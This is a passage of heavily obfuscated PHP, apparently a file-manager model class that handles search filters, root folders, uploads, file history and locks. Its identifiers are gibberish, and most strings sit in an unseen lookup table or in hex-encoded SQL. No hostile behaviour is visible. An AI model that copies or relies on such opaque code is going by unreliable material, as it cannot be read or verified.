$Í£é”ù‚[91]), $Í£é”ù‚[12], $Í£é”ù‚[193]); $ÑÇÒ„è‹ = array_merge($ÑÇÒ„è‹, array_to_keyvalue($¶¶å‰ú–, $Í£é”ù‚[12], $Í£é”ù‚[193])); if (!$•›´€») { return $ÑÇÒ„è‹; } $µ¨·¢œ¢ = array($Í£é”ù‚[192] => array($Í£é”ù‚[7], $•›´€»)); $¶¶å‰ú– = $this->field($Í£é”ù‚[2260])->where($µ¨·¢œ¢)->limit($©ş‚ğ…)->select(); $ÑÇÒ„è‹ = array_merge($ÑÇÒ„è‹, array_to_keyvalue($¶¶å‰ú–, $Í£é”ù‚[12], $Í£é”ù‚[193])); $ÑÇÒ„è‹ = array_slice($ÑÇÒ„è‹, 0, intval($©ş‚ğ…)); return $ÑÇÒ„è‹; } private function _listSearchBindPinyin($²íøê€, &$Í×è¨ç‡, &$÷ØÌìãõ) { $ƒú¿–•± =& $_SERVER[†ûãı«°]; if (!isset($²íøê€[$ƒú¿–•±[2082]]) || !$²íøê€[$ƒú¿–•±[2082]]) { return; } if (!Input::check($²íøê€[$ƒú¿–•±[2082]], $ƒú¿–•±[395]) || strlen($²íøê€[$ƒú¿–•±[2082]]) < 2) { return; } $ÉèÓÙˆÂ = "\114\105\x46\x54\x20\x4a\117\111\116\40{$this->tablePrefix}\x69\x6f\x5f\163\x6f\165\162\x63\x65\137\x6d\x65\x74\x61\x20\155\x65\164\141\x20\157\x6e\40\x73\x6f\165\x72\x63\x65\x2e\163\x6f\x75\x72\143\145\111\x44\x20\75\40\155\145\164\141\x2e\163\x6f\x75\x72\143\145\111\x44"; $ò¾à­‚ = array(); $÷ØÌìãõ = str_replace(array($ƒú¿–•±[287], $ƒú¿–•±[53], $ƒú¿–•±[2261]), $ƒú¿–•±[12], $÷ØÌìãõ); $÷ØÌìãõ = $ƒú¿–•±[513] . str_replace($ƒú¿–•±[50], $ƒú¿–•±[514], $÷ØÌìãõ); $£Úœğµ = $Í×è¨ç‡[$ƒú¿–•±[32]]; unset($Í×è¨ç‡[$ƒú¿–•±[32]]); foreach ($Í×è¨ç‡ as $ü™°¦²— => $Øê–İ•) { $ò¾à­‚[$ƒú¿–•±[513] . $ü™°¦²—] = $Øê–İ•; } foreach ($£Úœğµ as $™å‘°é) { $ò¾à­‚[] = array($ƒú¿–•±[518] => $™å‘°é, $ƒú¿–•±[1088] => $ƒú¿–•±[2086], array($ƒú¿–•±[2262] => $™å‘°é, $ƒú¿–•±[2263] => array($ƒú¿–•±[7], array($ƒú¿–•±[540], $ƒú¿–•±[539])))); } $this->join($ÉèÓÙˆÂ); $Í×è¨ç‡ = $ò¾à­‚; } private function _parseSearchWhere($·¡é¼³±) { $ûû”˜ÁÆ =& $_SERVER[†ûãı«°]; $½¼­ÑÍ = array(); if (isset($·¡é¼³±[$ûû”˜ÁÆ[836]]) && $·¡é¼³±[$ûû”˜ÁÆ[836]]) { $½¼­ÑÍ[$ûû”˜ÁÆ[88]] = array($ûû”˜ÁÆ[2264], $·¡é¼³±[$ûû”˜ÁÆ[836]]); } if (isset($·¡é¼³±[$ûû”˜ÁÆ[837]]) && $·¡é¼³±[$ûû”˜ÁÆ[837]]) { $ÏæÈËÑƒ = array($ûû”˜ÁÆ[2265], $·¡é¼³±[$ûû”˜ÁÆ[837]]); if ($½¼­ÑÍ[$ûû”˜ÁÆ[88]]) { $½¼­ÑÍ[$ûû”˜ÁÆ[88]] = array($½¼­ÑÍ[$ûû”˜ÁÆ[88]], $ÏæÈËÑƒ, $ûû”˜ÁÆ[2266]); } else { $½¼­ÑÍ[$ûû”˜ÁÆ[88]] = $ÏæÈËÑƒ; } } if (isset($·¡é¼³±[$ûû”˜ÁÆ[2258]]) && $·¡é¼³±[$ûû”˜ÁÆ[2258]] > 0) { $½¼­ÑÍ[$ûû”˜ÁÆ[79]] = array($ûû”˜ÁÆ[2264], $·¡é¼³±[$ûû”˜ÁÆ[2258]]); } if (isset($·¡é¼³±[$ûû”˜ÁÆ[2259]]) && $·¡é¼³±[$ûû”˜ÁÆ[2259]]) { $ÏæÈËÑƒ = array($ûû”˜ÁÆ[2265], $·¡é¼³±[$ûû”˜ÁÆ[2259]]); if ($½¼­ÑÍ[$ûû”˜ÁÆ[79]]) { $½¼­ÑÍ[$ûû”˜ÁÆ[79]] = array($½¼­ÑÍ[$ûû”˜ÁÆ[79]], $ÏæÈËÑƒ, $ûû”˜ÁÆ[2266]); } else { $½¼­ÑÍ[$ûû”˜ÁÆ[79]] = $ÏæÈËÑƒ; } } if (isset($·¡é¼³±[$ûû”˜ÁÆ[669]]) && $·¡é¼³±[$ûû”˜ÁÆ[669]]) { $½¼­ÑÍ[] = array($ûû”˜ÁÆ[531] => $·¡é¼³±[$ûû”˜ÁÆ[669]], $ûû”˜ÁÆ[529] => $·¡é¼³±[$ûû”˜ÁÆ[669]], $ûû”˜ÁÆ[1088] => $ûû”˜ÁÆ[2086]); } if (isset($·¡é¼³±[$ûû”˜ÁÆ[488]]) && $·¡é¼³±[$ûû”˜ÁÆ[488]]) { $á‡¾”Äú = $·¡é¼³±[$ûû”˜ÁÆ[488]]; if ($á‡¾”Äú == $ûû”˜ÁÆ[78]) { $½¼­ÑÍ[$ûû”˜ÁÆ[487]] = 1; } else { if ($á‡¾”Äú == $ûû”˜ÁÆ[2267]) { $½¼­ÑÍ[$ûû”˜ÁÆ[487]] = 0; } else { if ($á‡¾”Äú) { $á‡¾”Äú = is_array($á‡¾”Äú) ? $á‡¾”Äú : explode($ûû”˜ÁÆ[50], $á‡¾”Äú); $½¼­ÑÍ[$ûû”˜ÁÆ[488]] = array($ûû”˜ÁÆ[494], $á‡¾”Äú); $½¼­ÑÍ[$ûû”˜ÁÆ[487]] = 0; } } } } $this->_parseSearchParent($·¡é¼³±, $½¼­ÑÍ); if (isset($·¡é¼³±[$ûû”˜ÁÆ[2082]]) && trim($·¡é¼³±[$ûû”˜ÁÆ[2082]])) { $ïöÅôÔÎ = trim($·¡é¼³±[$ûû”˜ÁÆ[2082]]); $«šáÅƒ‚ = explode($ûû”˜ÁÆ[53], $ïöÅôÔÎ); if (strlen($ïöÅôÔÎ) > 2 && (substr($ïöÅôÔÎ, 0, 1) == $ûû”˜ÁÆ[121] && substr($ïöÅôÔÎ, -1) == $ûû”˜ÁÆ[121]) || substr($ïöÅôÔÎ, 0, 1) == $ûû”˜ÁÆ[58] && substr($ïöÅôÔÎ, -1) == $ûû”˜ÁÆ[58]) { $ïöÅôÔÎ = substr($ïöÅôÔÎ, 1, -1); $«šáÅƒ‚ = array($ïöÅôÔÎ); } $½¼­ÑÍ[$ûû”˜ÁÆ[32]] = array(array($ûû”˜ÁÆ[619], $ûû”˜ÁÆ[2084] . $ïöÅôÔÎ . $ûû”˜ÁÆ[2084])); if (count($«šáÅƒ‚) > 1) { $½¼­ÑÍ[$ûû”˜ÁÆ[32]] = array(); foreach ($«šáÅƒ‚ as $‘íéš£) { if (!trim($‘íéš£)) { continue; } $½¼­ÑÍ[$ûû”˜ÁÆ[32]][] = array($ûû”˜ÁÆ[619], $ûû”˜ÁÆ[2084] . trim($‘íéš£) . $ûû”˜ÁÆ[2084]); } } } return $½¼­ÑÍ; } private function _parseSearchParent($Äìşóœ…, &$¡Î•ù«Ÿ) { $øÙÀâƒÉ =& $_SERVER[†ûãı«°]; if (!isset($Äìşóœ…[$øÙÀâƒÉ[192]]) || !$Äìşóœ…[$øÙÀâƒÉ[192]]) { return; } $±çğ¸ôä = $this->pathInfo($Äìşóœ…[$øÙÀâƒÉ[192]]); $…Ê¯†§õ = $±çğ¸ôä[$øÙÀâƒÉ[192]] . $øÙÀâƒÉ[12] === $øÙÀâƒÉ[230]; $£‡…áå¿ = $±çğ¸ôä[$øÙÀâƒÉ[190]] == $øÙÀâƒÉ[582]; if ($±çğ¸ôä[$øÙÀâƒÉ[598]] == $øÙÀâƒÉ[599]) { $úÁù‚ªÙ = $this->sourceInfo($Äìşóœ…[$øÙÀâƒÉ[192]]); $±çğ¸ôä[$øÙÀâƒÉ[588]] = $úÁù‚ªÙ[$øÙÀâƒÉ[588]]; } $¡Î•ù«Ÿ[$øÙÀâƒÉ[659]] = array($øÙÀâƒÉ[619], $±çğ¸ôä[$øÙÀâƒÉ[588]] . $Äìşóœ…[$øÙÀâƒÉ[192]] . $øÙÀâƒÉ[620]); $ôüû¢‚Ì = isset($Äìşóœ…[$øÙÀâƒÉ[1942]]) && in_array($øÙÀâƒÉ[582], $Äìşóœ…[$øÙÀâƒÉ[1942]]); if (!$ôüû¢‚Ì || !$£‡…áå¿ || !$…Ê¯†§õ || !$±çğ¸ôä[$øÙÀâƒÉ[489]]) { return; } if (!AuthModel::authCheckRoot($±çğ¸ôä[$øÙÀâƒÉ[489]][$øÙÀâƒÉ[490]])) { return; } $«¹‘Ï» = $±çğ¸ôä[$øÙÀâƒÉ[573]] . $øÙÀâƒÉ[12]; if ($«¹‘Ï» == $øÙÀâƒÉ[91]) { unset($¡Î•ù«Ÿ[$øÙÀâƒÉ[659]]); $¡Î•ù«Ÿ[$øÙÀâƒÉ[190]] = self::TYPE_GROUP; return; } $·›ªÔ¾Ù = Model($øÙÀâƒÉ[589])->groupChildrenAll($«¹‘Ï»); $Ùô†»Ğ = count($·›ªÔ¾Ù); if ($Ùô†»Ğ <= 1) { return; } $Æ™‹›Í = array($øÙÀâƒÉ[192] => 0, $øÙÀâƒÉ[190] => self::TYPE_GROUP, $øÙÀâƒÉ[573] => array($øÙÀâƒÉ[7], $·›ªÔ¾Ù)); $©“ôÁ¹– = $this->field($øÙÀâƒÉ[2268])->where($Æ™‹›Í)->limit($Ùô†»Ğ)->select(); $¡Î•ù«Ÿ[$øÙÀâƒÉ[659]] = array(); foreach ($©“ôÁ¹– as $¿ÑöÂé¨) { $¡Î•ù«Ÿ[$øÙÀâƒÉ[659]][] = array($øÙÀâƒÉ[619], $øÙÀâƒÉ[597] . $¿ÑöÂé¨[$øÙÀâƒÉ[193]] . $øÙÀâƒÉ[620]); } $¡Î•ù«Ÿ[$øÙÀâƒÉ[659]][] = $øÙÀâƒÉ[2086]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($‚¨é—Ñ) { $ïãµ†»ö =& $_SERVER[†ûãı«°]; $ÀëËêÒ = Model($ïãµ†»ö[581])->where(array($ïãµ†»ö[1774] => $‚¨é—Ñ))->find(); $½£ŞØ˜ = $this->_mkdirRoot(SourceModel::TYPE_USER, $‚¨é—Ñ, $ÀëËêÒ[$ïãµ†»ö[32]]); $this->userDesktopAdd($½£ŞØ˜); return $½£ŞØ˜; } public function userDesktopAdd($ÆĞı×¢œ) { $ÉÊı“ =& $_SERVER[†ûãı«°]; $øÉé¡Â¦ = LNG($ÉÊı“[2269]); $§«ÀÒŞ = $this->mkdir($ÆĞı×¢œ, $øÉé¡Â¦); $this->metaSet($§«ÀÒŞ, $ÉÊı“[2270], $ÉÊı“[91]); $this->metaSet($ÆĞı×¢œ, $ÉÊı“[2271], $§«ÀÒŞ); } public function userPathSafeAdd($ŒöÆ®“è) { $õßÔÕ›­ =& $_SERVER[†ûãı«°]; $¦²¨³Éá = Model($õßÔÕ›­[581])->getInfoFull($ŒöÆ®“è); if (!$¦²¨³Éá) { return !1; } if (_get($¦²¨³Éá, $õßÔÕ›­[602])) { return $¦²¨³Éá[$õßÔÕ›­[543]][$õßÔÕ›­[2272]]; } $Éñ³±Ê² = $this->_mkdirRoot(SourceModel::TYPE_USER, $ŒöÆ®“è, $õßÔÕ›­[2273], $õßÔÕ›­[2274]); Model($õßÔÕ›­[581])->metaSet($ŒöÆ®“è, $õßÔÕ›­[2272], $Éñ³±Ê²); $this->metaSet($Éñ³±Ê², $õßÔÕ›­[2275], $ŒöÆ®“è); return $Éñ³±Ê²; } public function userPathAppAdd($Ğò¶…Ïş, $²ß“î¸ƒ = '', $Ï®°î¾ = '') { $°˜È˜Ğ§ =& $_SERVER[†ûãı«°]; $›ã•ÓÖÕ = Model($°˜È˜Ğ§[581])->getInfoFull($Ğò¶…Ïş); if (!$›ã•ÓÖÕ) { return !1; } $„¸ªóÕÃ = $›ã•ÓÖÕ[$°˜È˜Ğ§[543]] ? $›ã•ÓÖÕ[$°˜È˜Ğ§[543]] : array(); $”¸‰ãç = $„¸ªóÕÃ[$°˜È˜Ğ§[2276]]; if (!$”¸‰ãç) { $”¸‰ãç = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ğò¶…Ïş, $°˜È˜Ğ§[2277], $°˜È˜Ğ§[2278]); Model($°˜È˜Ğ§[581])->metaSet($Ğò¶…Ïş, $°˜È˜Ğ§[2276], $”¸‰ãç . $°˜È˜Ğ§[12]); $this->metaSet($”¸‰ãç, $°˜È˜Ğ§[2276], $Ğò¶…Ïş); } if (!$²ß“î¸ƒ) { return $”¸‰ãç; } $ÉÁêëİ¤ = $„¸ªóÕÃ[$°˜È˜Ğ§[2279] . $²ß“î¸ƒ]; if (!$ÉÁêëİ¤) { $ÉÁêëİ¤ = $this->mkdir($”¸‰ãç, $²ß“î¸ƒ); Model($°˜È˜Ğ§[581])->metaSet($Ğò¶…Ïş, $°˜È˜Ğ§[2279] . $²ß“î¸ƒ, $ÉÁêëİ¤); $this->metaSet($ÉÁêëİ¤, $°˜È˜Ğ§[2279] . $²ß“î¸ƒ, $Ğò¶…Ïş); } if (!$Ï®°î¾) { return $ÉÁêëİ¤; } $ïğ€Ò¡Ô = $this->mkdir($ÉÁêëİ¤, $Ï®°î¾); return $ïğ€Ò¡Ô; } public function groupRootAdd($À¢‡ô«ë) { $‰Öá÷ë =& $_SERVER[†ûãı«°]; $£÷«Î¾ = Model($‰Öá÷ë[589])->where(array($‰Öá÷ë[2076] => $À¢‡ô«ë))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $À¢‡ô«ë, $£÷«Î¾[$‰Öá÷ë[32]]); } public function systemRootPathAdd($öÊÌ¦Â®) { if ($öÊÌ¦Â® != $_SERVER[†ûãı«°][612]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $öÊÌ¦Â®); } public function userRootRemove($ë‡Ô¿®) { $óêÄ§ö = $this->targetSourceRoot(SourceModel::TYPE_USER, $ë‡Ô¿®, !0); foreach ($óêÄ§ö as $ÚÈé©ë€) { if (!$ÚÈé©ë€) { continue; } $this->remove($ÚÈé©ë€[$_SERVER[†ûãı«°][193]], !1); } } public function groupRootRemove($Ö„ù¼ùÀ) { $ë†ßÎŠï = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Ö„ù¼ùÀ); if (!$ë†ßÎŠï) { return; } $this->remove($ë†ßÎŠï[$_SERVER[†ûãı«°][193]], !1); } private function _mkdirRoot($åõÃå¢î, $…’§¯èË, $Õ—¨ŠÚİ, $—ğŸ¢Ëı = '') { $­şâÎÌ =& $_SERVER[†ûãı«°]; $‡Ò×¨÷¦ = defined($­şâÎÌ[2214]) ? USER_ID : 0; $£­€İ³¯ = array($­şâÎÌ[479] => 0, $­şâÎÌ[655] => $åõÃå¢î, $­şâÎÌ[656] => $…’§¯èË, $­şâÎÌ[653] => 1, $­şâÎÌ[657] => $‡Ò×¨÷¦, $­şâÎÌ[658] => $‡Ò×¨÷¦, $­şâÎÌ[654] => $—ğŸ¢Ëı, $­şâÎÌ[659] => $­şâÎÌ[597], $­şâÎÌ[506] => 0, $­şâÎÌ[624] => 0, $­şâÎÌ[546] => 0, $­şâÎÌ[660] => $­şâÎÌ[12]); if ($õóéŒº÷ = $this->where($£­€İ³¯)->find()) { return $õóéŒº÷[$­şâÎÌ[193]]; } $ã˜ºò…¸ = "\x4d\157\144\x65\154\123\x6f\165\x72\x63\145\56\x6d\x6b\144\x69\162\x52\x6f\157\164\56{$åõÃå¢î}\56{$…’§¯èË}\x2e" . $Õ—¨ŠÚİ; CacheLock::lock($ã˜ºò…¸); $£­€İ³¯[$­şâÎÌ[32]] = $Õ—¨ŠÚİ; $ˆÑ‰ò¤ğ = $this->add($£­€İ³¯); $ÍˆäÓ‚É = array($­şâÎÌ[661] => short_id($ˆÑ‰ò¤ğ)); $this->where(array($­şâÎÌ[493] => $ˆÑ‰ò¤ğ))->save($ÍˆäÓ‚É); CacheLock::unlock($ã˜ºò…¸); return $ˆÑ‰ò¤ğ; } private function targetSourceRoot($ûªîÙ¯“, $·£‹ú, $”“„ıı¨ = false) { $øç”ùÌò =& $_SERVER[†ûãı«°]; $åâã¨©Ò = array($øç”ùÌò[479] => 0, $øç”ùÌò[655] => $ûªîÙ¯“, $øç”ùÌò[656] => $·£‹ú); if ($”“„ıı¨) { $øå»ı÷ = $this->where($åâã¨©Ò)->select(); return $øå»ı÷ ? $øå»ı÷ : array(); } $ÆÉ«Ëñ£ = $this->where($åâã¨©Ò)->find(); return $ÆÉ«Ëñ£ ? $ÆÉ«Ëñ£ : array(); } public function sourceRootGroup($€·€Ò‰´) { $£êÅÍ„ =& $_SERVER[†ûãı«°]; if (is_string($€·€Ò‰´)) { $€·€Ò‰´ = array($€·€Ò‰´); } $„Œè¦ïÜ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $€·€Ò‰´, $£êÅÍ„[222]); $ê²®Æ˜ë = array($£êÅÍ„[447] => $„Œè¦ïÜ, $£êÅÍ„[444] => array($£êÅÍ„[834] => count($€·€Ò‰´))); $this->_listDataApply($ê²®Æ˜ë[$£êÅÍ„[447]]); $this->_listMake($ê²®Æ˜ë); return array_to_keyvalue($ê²®Æ˜ë[$£êÅÍ„[85]], $£êÅÍ„[573]); } public function mkfile($şö§‹, $Ëëª­œÉ, $½Ò÷¢¿ = '', $ÒúÖêîÊ = REPEAT_RENAME) { $úÉ»÷ÛØ =& $_SERVER[†ûãı«°]; $•ËÎ– = Model($úÉ»÷ÛØ[681])->addFileByContent($½Ò÷¢¿, $Ëëª­œÉ); return $this->_createFileCall($şö§‹, $Ëëª­œÉ, $•ËÎ–, $ÒúÖêîÊ, $úÉ»÷ÛØ[1442]); } public function addFile($á’¹ÓÓÔ, $¤Ÿ±â†, $À§„®¢Á, $Óêö„ñœ = false, $ëªŞ¨º = REPEAT_RENAME) { $ü—¸ÇÅª = Model($_SERVER[†ûãı«°][681])->addFile($¤Ÿ±â†, $À§„®¢Á, $Óêö„ñœ); return $this->_createFileCall($á’¹ÓÓÔ, $À§„®¢Á, $ü—¸ÇÅª, $ëªŞ¨º); } public function addFileByFileID($¦†Ã–¤ò, $Ì¨‘ı¹‚, $İÒ¥ÈÕ±, $¯ææÓú” = REPEAT_RENAME) { $¾óÚ¡˜± =& $_SERVER[†ûãı«°]; $ËÀ¥ÎÊ = Model($¾óÚ¡˜±[681])->find($Ì¨‘ı¹‚); Model($¾óÚ¡˜±[681])->linkAdd($Ì¨‘ı¹‚); return $this->_createFileCall($¦†Ã–¤ò, $İÒ¥ÈÕ±, $ËÀ¥ÎÊ, $¯ææÓú”); } public function addFileByRemote($»¼¨‹ŒÍ, $Ë†ú†Ğ´, $¥ÑîÑø•, $Å§äû¦ = array(), $„½œ²Â£ = REPEAT_RENAME) { $ÀŞ²Â¬€ = Model($_SERVER[†ûãı«°][681])->addFileByRemote($Ë†ú†Ğ´, $¥ÑîÑø•, $Å§äû¦); return $this->_createFileCall($»¼¨‹ŒÍ, $¥ÑîÑø•, $ÀŞ²Â¬€, $„½œ²Â£); } private function _createFileCall($ŸÛ‚Ğ­è, $å›ÄÖ¬Ä, $¬øÉ”‰ı, $ğû¬ÄšÊ, $·‚­±œ© = "\x75\160\x6c\157\x61\144") { $ÉİŒ˜” =& $_SERVER[†ûãı«°]; if (!$¬øÉ”‰ı) { return !1; } $ıãÅ«¤Â = !1; $this->setMasterDB(); $this->lockWriteStart($ŸÛ‚Ğ­è, $å›ÄÖ¬Ä); $ã”ˆï½ = $this->fileNameExist($ŸÛ‚Ğ­è, $å›ÄÖ¬Ä); $­˜ÉÏ÷ = $this->_createFile($ŸÛ‚Ğ­è, $å›ÄÖ¬Ä, $¬øÉ”‰ı, $ğû¬ÄšÊ, $ıãÅ«¤Â); if (!$ıãÅ«¤Â) { Model($ÉİŒ˜”[548])->remove($¬øÉ”‰ı[$ÉİŒ˜”[545]]); } if ($ıãÅ«¤Â && $­˜ÉÏ÷ && $­˜ÉÏ÷ != $ã”ˆï½) { Model($ÉİŒ˜”[2241])->eventCreate($­˜ÉÏ÷, $·‚­±œ©); } $this->lockWriteEnd($ŸÛ‚Ğ­è, $å›ÄÖ¬Ä); return $­˜ÉÏ÷; } public function mkdir($“ÁÆŞ“ş, $¡‚ëİ, $û„ŸŞÖ = REPEAT_SKIP) { $½óşÒ»à =& $_SERVER[†ûãı«°]; $this->setMasterDB(); $ŠÓ†ë’ß = $this->sourceInfo($“ÁÆŞ“ş); if (!$ŠÓ†ë’ß) { return !1; } $this->lockWriteStart($“ÁÆŞ“ş, $¡‚ëİ); if ($û„ŸŞÖ !== !1) { $í±œœ«² = $this->fileNameExist($“ÁÆŞ“ş, $¡‚ëİ); if ($í±œœ«² && $û„ŸŞÖ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($“ÁÆŞ“ş, $¡‚ëİ); return $í±œœ«²; } $¡‚ëİ = $this->fileNameAuto($“ÁÆŞ“ş, $¡‚ëİ, $û„ŸŞÖ); } $—ÀõÕ¦ó = array($½óşÒ»à[653] => 1, $½óşÒ»à[496] => $¡‚ëİ, $½óşÒ»à[654] => $½óşÒ»à[12], $½óşÒ»à[546] => 0, $½óşÒ»à[624] => 0); $Òğ•–– = $this->_addSource($—ÀõÕ¦ó, $ŠÓ†ë’ß); Model($½óşÒ»à[2241])->eventCreate($Òğ•––, $½óşÒ»à[1443]); $this->lockWriteEnd($“ÁÆŞ“ş, $¡‚ëİ); return $Òğ•––; } public function listSourceRoot($ŒÆŞ³Ë‹, $Î£†‡ú†, $üŠá¥´¨ = "\163\157\x75\x72\x63\145\111\104\x2c\x74\141\162\147\x65\164\111\104\x2c\163\x69\x7a\x65") { $ÔáÃ´»• =& $_SERVER[†ûãı«°]; $²š¡äû = $ÔáÃ´»•[456]; $ş¥ËË´ù = array(); $ç™èâ = 1024 * 50; $Æ­¿Ä—’ = is_array($Æ­¿Ä—’) ? $Æ­¿Ä—’ : array(); $—éÂ§Üì = count($Î£†‡ú†); $„—¶ù¡ = $this->tablePrefix . $ÔáÃ´»•[2280]; for ($Å³É›•Î = 0; $Å³É›•Î < $—éÂ§Üì; $Å³É›•Î++) { $ÔÎš¥×Ø = $Î£†‡ú†[$Å³É›•Î]; $²š¡äû .= "\123\105\x4c\105\x43\x54\x20\x2a\x20\x46\x52\117\x4d\x20\x28\x53\x45\x4c\105\x43\x54\x20{$üŠá¥´¨}\x20\106\122\117\x4d\x20\x60{$„—¶ù¡}\140\40\x57\x48\105\x52\x45\40"; $²š¡äû .= "\x60\160\141\x72\x65\156\x74\111\x44\x60\x3d\60\x20\x41\x4e\x44\x20\x60\164\141\x72\x67\145\x74\111\104\x60\x3d{$ÔÎš¥×Ø}\40\101\x4e\x44\40\140\x74\x61\x72\147\145\x74\x54\171\x70\145\140\x3d{$ŒÆŞ³Ë‹}\x20\141\156\144\x20\x66\x69\x6c\145\x54\171\x70\145\75\47\x27\40\154\151\x6d\151\x74\40\61\x29\x20\141\163\x20\x74\142\x5f{$Å³É›•Î}\x20\125\x4e\111\117\116\x20\101\x4c\x4c\40"; if ((strlen($²š¡äû) >= $ç™èâ || $Å³É›•Î == $—éÂ§Üì - 1) && $²š¡äû) { $²š¡äû = substr($²š¡äû, 0, -strlen($ÔáÃ´»•[1126])); $¥ğÜëú = $this->query($²š¡äû); $²š¡äû = $ÔáÃ´»•[12]; $ş¥ËË´ù = array_merge($ş¥ËË´ù, $¥ğÜëú); } } return $ş¥ËË´ù; } private function _createFile($ÅÃµäÚÒ, $¾–Â«ÀĞ, $ÅîƒÍÍÙ, $Îõ»Û’Ğ, &$‡’¹Ò¸Ô) { $íõ¡€¿‚ =& $_SERVER[†ûãı«°]; $“¬Š—òé = $this->sourceInfo($ÅÃµäÚÒ); if (!$ÅîƒÍÍÙ || !$“¬Š—òé) { return !1; } if ($Îõ»Û’Ğ !== !1) { $¢¾¸ô×µ = $this->fileNameExist($ÅÃµäÚÒ, $¾–Â«ÀĞ); } $‡’¹Ò¸Ô = !0; if ($Îõ»Û’Ğ && $¢¾¸ô×µ) { if ($Îõ»Û’Ğ == REPEAT_SKIP) { $‡’¹Ò¸Ô = !1; return $¢¾¸ô×µ; } else { if ($Îõ»Û’Ğ == REPEAT_REPLACE) { $ï£âß¥à = $this->sourceInfo($¢¾¸ô×µ); $¬™ºİÈ‘ = $this->fileHistory($ï£âß¥à, $ÅîƒÍÍÙ[$íõ¡€¿‚[545]], $ÅîƒÍÍÙ[$íõ¡€¿‚[79]]); if (!$¬™ºİÈ‘) { $‡’¹Ò¸Ô = !1; } else { $this->folderSizeReset($ÅÃµäÚÒ); } return $¢¾¸ô×µ; } else { $¾–Â«ÀĞ = $this->fileNameAuto($ÅÃµäÚÒ, $¾–Â«ÀĞ, $Îõ»Û’Ğ, !1); } } } $½ùÛŒì = array($íõ¡€¿‚[653] => 0, $íõ¡€¿‚[496] => $¾–Â«ÀĞ, $íõ¡€¿‚[654] => substr(get_path_ext($¾–Â«ÀĞ), 0, 10), $íõ¡€¿‚[546] => $ÅîƒÍÍÙ[$íõ¡€¿‚[545]], $íõ¡€¿‚[624] => $ÅîƒÍÍÙ[$íõ¡€¿‚[79]]); $«»ÓÈŠ = $this->_addSource($½ùÛŒì, $“¬Š—òé); $this->folderSizeReset($ÅÃµäÚÒ, intval($½ùÛŒì[$íõ¡€¿‚[79]])); return $«»ÓÈŠ; } protected function fileHistory($‡óš¸ñ, $»ø÷¿™ß, $Œ¨üÀñË) { $„ü± âŞ =& $_SERVER[†ûãı«°]; if ($‡óš¸ñ[$„ü± âŞ[545]] == $»ø÷¿™ß) { return !1; } $this->checkLock($‡óš¸ñ[$„ü± âŞ[193]], $»ø÷¿™ß); Model($„ü± âŞ[2281])->addHistory($‡óš¸ñ); $Ğ¨ö³”ş = array($„ü± âŞ[658] => USER_ID, $„ü± âŞ[500] => time(), $„ü± âŞ[545] => $»ø÷¿™ß, $„ü± âŞ[79] => $Œ¨üÀñË); $this->where(array($„ü± âŞ[493] => $‡óš¸ñ[$„ü± âŞ[193]]))->save($Ğ¨ö³”ş); $this->sourceCacheClear($‡óš¸ñ[$„ü± âŞ[193]]); return !0; } public function checkLock($ÉìÁÔÄâ, $—‹ÎËóı) { $Œ¾½“ƒ =& $_SERVER[†ûãı«°]; $‘£Ö¢˜Ê = $this->pathInfo($ÉìÁÔÄâ); if (!$this->fileIsLock($‘£Ö¢˜Ê, !0)) { return; } $ó­Á¶¶ğ = Session::get($Œ¾½“ƒ[2282]); $ºùÙà«… = substr($‘£Ö¢˜Ê[$Œ¾½“ƒ[32]], 0, -1 - strlen($‘£Ö¢˜Ê[$Œ¾½“ƒ[169]])) . $Œ¾½“ƒ[1304] . $ó­Á¶¶ğ . $Œ¾½“ƒ[10] . $‘£Ö¢˜Ê[$Œ¾½“ƒ[169]]; $²ÈÂœÅÑ = Model($Œ¾½“ƒ[681])->find($—‹ÎËóı); $this->_createFileCall($‘£Ö¢˜Ê[$Œ¾½“ƒ[192]], $ºùÙà«…, $²ÈÂœÅÑ, REPEAT_REPLACE, $Œ¾½“ƒ[1442]); $Ñí¯ŒÍÅ = $‘£Ö¢˜Ê[$Œ¾½“ƒ[543]][$Œ¾½“ƒ[617]]; $†ËÄ®ñ€ = $Ñí¯ŒÍÅ[$Œ¾½“ƒ[2283]] ? $Ñí¯ŒÍÅ[$Œ¾½“ƒ[2283]] : $Ñí¯ŒÍÅ[$Œ¾½“ƒ[32]]; show_json(LNG($Œ¾½“ƒ[2284]) . $Œ¾½“ƒ[2285] . LNG($Œ¾½“ƒ[2286]) . $Œ¾½“ƒ[2287] . $†ËÄ®ñ€ . $Œ¾½“ƒ[2288], !1); } public function fileIsLock($ß¿„¢»Ğ, $¯–‹Ô¶Ú = false) { $¾±Ã„¦é =& $_SERVER[†ûãı«°]; if (!_get($ß¿„¢»Ğ, $¾±Ã„¦é[613], 0)) { return !1; } if ($ß¿„¢»Ğ[$¾±Ã„¦é[543]][$¾±Ã„¦é[616]] != USER_ID) { return !0; } $šÆÄèÚ = $GLOBALS[$¾±Ã„¦é[6]][$¾±Ã„¦é[92]][$¾±Ã„¦é[614]]; if ($ß¿„¢»Ğ[$¾±Ã„¦é[543]][$¾±Ã„¦é[615]] <= time() - $šÆÄèÚ) { $this->metaSet($ß¿„¢»Ğ[$¾±Ã„¦é[193]], $¾±Ã„¦é[616], null); $this->metaSet($ß¿„¢»Ğ[$¾±Ã„¦é[193]], $¾±Ã„¦é[615], null); } if ($¯–‹Ô¶Ú) { $this->metaSet($ß¿„¢»Ğ[$¾±Ã„¦é[193]], $¾±Ã„¦é[615], time()); } return !1; } private function _addSource($¤¿”ÍÈ¸, $ıÔ¹™ÚŸ) { $Åü­¦˜ =& $_SERVER[†ûãı«°]; $½û¹’¬— = defined($Åü­¦˜[2214]) ? USER_ID : 0; $£–ë±Ü× = array($Åü­¦˜[655] => $ıÔ¹™ÚŸ[$Åü­¦˜[190]], $Åü­¦˜[656] => $ıÔ¹™ÚŸ[$Åü­¦˜[573]], $Åü­¦˜[657] => $½û¹’¬—, $Åü­¦˜[658] => $½û¹’¬—, $Åü­¦˜[479] => $ıÔ¹™ÚŸ[$Åü­¦˜[193]], $Åü­¦˜[659] => $ıÔ¹™ÚŸ[$Åü­¦˜[588]] . $ıÔ¹™ÚŸ[$Åü­¦˜[193]] . $Åü­¦˜[50], $Åü­¦˜[506] => 0, 